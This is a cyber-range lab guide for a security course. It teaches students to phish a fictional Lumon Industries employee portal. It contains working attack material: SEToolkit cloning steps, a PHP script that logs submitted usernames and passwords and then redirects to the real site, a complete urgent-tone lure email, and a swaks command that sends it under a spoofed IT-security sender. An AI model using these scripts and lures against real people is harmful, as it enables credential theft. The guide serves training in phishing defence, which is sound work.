# Email Phishing Lab Guide

## Objective

Use email-based phishing techniques to:

- Craft and deliver a phishing email to a user on the Lumon Industries network
- Host a cloned website to convincingly mimic a real login page and harvest user credentials
- Understand how email delivery works and how phishing campaigns operate

## Tools

You may use any of the following tools (or alternatives of your choice):

### Website Cloning & Hosting:
- Social Engineering Toolkit (SEToolkit)
- Apache2, nginx, or a lightweight HTTP server like python3 -m http.server

### Email Sending:
- Command-line tools such as sendmail, swaks, msmtp
- Any GUI-based email client like Thunderbird or Evolution
- Any method that can send emails using the provided SMTP server within the cyber range

> **Note**: Emails can only be sent and received within the Lumon Industries network (cyber range).

## Email Configuration

Use the following email server settings for sending (and receiving) emails:

| Protocol | Server Address     | Port |
|----------|-------------------|------|
| SMTP     | mail.lumoninc.com | 25   |
| IMAP     | mail.lumoninc.com | 143  |
| POP3     | mail.lumoninc.com | 110  |

### Email Account Credentials:
- Username: sABC@mail.lumoninc.com
  (Replace ABC with the last three digits of your port number. For example, if your ssh port is 23101, your email username is s101@mail.lumoninc.com.)
- Password: Use the last password provided for your VM. If your VM has been reset, use the most recent password issued.

## Step-by-Step Instructions

### Part 1: Setting Up the Phishing Website

1. **Clone a target website** (For this lab, we'll clone the Lumon Industries employee portal login page)

   Using SEToolkit:
   ```bash
   sudo setoolkit
   # Select: 1) Social-Engineering Attacks
   # Select: 2) Website Attack Vectors
   # Select: 3) Credential Harvester Attack Method
   # Select: 2) Site Cloner
   # Enter your IP address when prompted
   # Enter the URL to clone (e.g., https://portal.lumoninc.com)
   ```

   Alternative with wget:
   ```bash
   wget -r -l 1 -k https://portal.lumoninc.com
   ```

2. **Modify the cloned website to capture credentials**

   Create a simple PHP script to log submitted credentials:
   ```bash
   cat > credentials.php << 'EOF'
   <?php
   $file = 'captured_creds.txt';
   $username = $_POST['username'];
   $password = $_POST['password'];
   $ip = $_SERVER['REMOTE_ADDR'];
   $date = date('Y-m-d H:i:s');
   
   $data = "Date: $date\nIP: $ip\nUsername: $username\nPassword: $password\n\n";
   file_put_contents($file, $data, FILE_APPEND);
   
   // Redirect to the real site after capturing credentials
   header('Location: https://portal.lumoninc.com');
   exit();
   ?>
   EOF
   ```

3. **Edit the HTML form** in the cloned index.html to submit to your credentials.php script:
   
   ```bash
   sed -i 's|action="[^"]*"|action="credentials.php"|g' index.html
   ```

4. **Start the web server** to host your phishing site:

   Using Apache:
   ```bash
   sudo service apache2 start
   # Copy files to /var/www/html/
   sudo cp -r * /var/www/html/
   ```

   Using Python's built-in server (for testing):
   ```bash
   python3 -m http.server 80
   ```

### Part 2: Crafting the Phishing Email

1. **Create an HTML email template** (save as email_template.html):

   ```html
   <html>
   <head>
   <title>Urgent: Security Update Required</title>
   </head>
   <body style="font-family: Arial, sans-serif; line-height: 1.6;">
   <div style="max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd;">
       <div style="text-align: center; margin-bottom: 20px;">
           <img src="https://lumoninc.com/logo.png" alt="Lumon Industries" style="max-width: 200px;">
       </div>
       
       <h2 style="color: #003366;">URGENT: Security Update Required</h2>
       
       <p>Dear Valued Employee,</p>
       
       <p>Our IT department has detected unusual login attempts on your account. As a precautionary measure, we require you to verify your account information <b>immediately</b>.</p>
       
       <p>Failure to verify within 24 hours may result in temporary account suspension in accordance with our updated security protocols.</p>
       
       <div style="text-align: center; margin: 30px 0;">
           <a href="http://YOUR-IP-ADDRESS" style="background-color: #003366; color: white; padding: 12px 30px; text-decoration: none; font-weight: bold; border-radius: 4px;">Verify Account Now</a>
       </div>
       
       <p>If you did not initiate this request, please contact IT support immediately.</p>
       
       <p>Thank you for your cooperation,<br>
       Lumon Industries IT Security Team</p>
       
       <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666;">
           <p>CONFIDENTIAL: This email contains confidential information and is intended only for the named recipient. If you are not the intended recipient, please delete this email and notify the sender immediately.</p>
       </div>
   </div>
   </body>
   </html>
   ```

   > **Important**: Replace "YOUR-IP-ADDRESS" with your actual IP address where the phishing site is hosted.

2. **Send the email** using a command-line tool or GUI email client:

   Using swaks (CLI):
   ```bash
   swaks --to victim@mail.lumoninc.com \
      --from it-security@mail.lumoninc.com \
      --server mail.lumoninc.com \
      --port 25 \
      --auth-user sABC@mail.lumoninc.com \
      --auth-password YOUR_PASSWORD \
      --h-Subject "Urgent: Security Alert - Immediate Action Required" \
      --body email_template.html \
      --data email_template.html
   ```

   Using Thunderbird or other GUI client:
   - Configure your mail account using the IMAP/SMTP settings provided above
   - Create a new message with HTML formatting
   - Copy and paste the HTML template content
   - Send to your target

### Part 3: Monitoring and Capturing Credentials

1. **Monitor the web server logs** for visitors:

   ```bash
   sudo tail -f /var/log/apache2/access.log
   ```

2. **Check for captured credentials**:

   ```bash
   cat captured_creds.txt
   ```

## Testing Your Phishing Campaign

Before targeting the actual victim, test your setup:

1. Send the phishing email to your own account (sABC@mail.lumoninc.com)
2. Check that the email renders correctly
3. Click the link and ensure it directs to your phishing site
4. Enter test credentials and confirm they're captured in the log file
5. Verify the redirect works properly

## Security Considerations

- This lab is for educational purposes only
- These techniques should only be used within the provided cyber range
- Do not attempt to use these methods outside of the lab environment

## Lab Submission

Prepare a report using the provided Word template, which must include:

1. A summary of your phishing approach (email content, tools used)
2. Screenshots of:
   - Your cloned site
   - The phishing email as received by the target
   - The captured credentials
3. Detailed steps of your process, including:
   - Any modifications you made to the basic instructions
   - Challenges encountered and how you overcame them
   - Analysis of what made your phishing attempt effective or ineffective

## Advanced Techniques (Optional)

For more advanced students:

1. Implement domain spoofing to make the email appear to come from a trusted domain
2. Add SSL/TLS to your phishing site for added credibility
3. Create a more sophisticated credential harvesting mechanism (e.g., logging additional data like browser info)
4. Implement email tracking to monitor when targets open emails

Remember: The goal of this lab is to understand how phishing attacks work so you can better defend against them in real-world scenarios. 